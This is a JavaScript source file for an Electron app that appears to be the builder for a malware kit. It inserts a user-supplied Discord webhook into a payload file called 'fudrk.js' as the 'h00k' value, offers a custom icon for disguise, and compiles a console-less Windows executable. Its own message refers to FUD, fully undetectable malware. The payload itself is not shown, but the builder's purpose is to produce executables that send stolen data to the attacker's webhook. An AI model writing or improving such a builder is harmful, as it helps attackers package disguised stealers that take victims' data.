const fs = require('fs');
const { dialog } = require('electron').remote;
const { exec } = require('child_process');

function replaceWebhook(webhook) {
    fs.readFile('fudrk.js', 'utf8', (err, data) => {
        if (err) {
            console.error(err);
            return;
        }
        const lines = data.split('\n').map(line => line.includes('h00k =') ? `h00k = "${webhook}"` : line);
        fs.writeFile('fudrk.js', lines.join('\n'), 'utf8', (err) => {
            if (err) {
                console.error(err);
            }
        });
    });
}

function selectIcon() {
    return dialog.showOpenDialog({
        properties: ['openFile'],
        filters: [{ name: 'Icon files', extensions: ['ico'] }]
    }).then(result => {
        if (!result.canceled) {
            return result.filePaths[0];
        }
        return '';
    }).catch(err => {
        console.error(err);
    });
}

async function addIcon() {
    let response = await dialog.showMessageBox({
        type: 'question',
        buttons: ['Yes', 'No'],
        title: 'Add Icon',
        message: 'Do you want to add an icon?'
    });
    return response.response === 0;
}

async function buildExe() {
    const webhook = document.getElementById('webhookEntry').value;
    if (webhook.includes('api/webhooks')) {
        replaceWebhook(webhook);
        const iconPath = await selectIcon();
        const iconOption = iconPath ? ` --icon="${iconPath}"` : '';
        
        dialog.showMessageBox({
            type: 'info',
            title: 'Information',
            message: 'Build process started. This may take a while...\nBuilt file won\'t be undetected (FUD)'
        });

        exec(`electron-builder build --win --x64 --no-console --dir${iconOption}`, (error, stdout, stderr) => {
            if (error) {
                console.error(`exec error: ${error}`);
                dialog.showErrorBox('Build Error', `An error occurred during the build process: ${error.message}`);
                return;
            }
            dialog.showMessageBox({
                type: 'info',
                title: 'Build Success',
                message: 'Build process completed successfully. Check your dist folder.'
            });
        });
    } else {
        dialog.showErrorBox('Error', 'Invalid webhook URL!');
    }
}
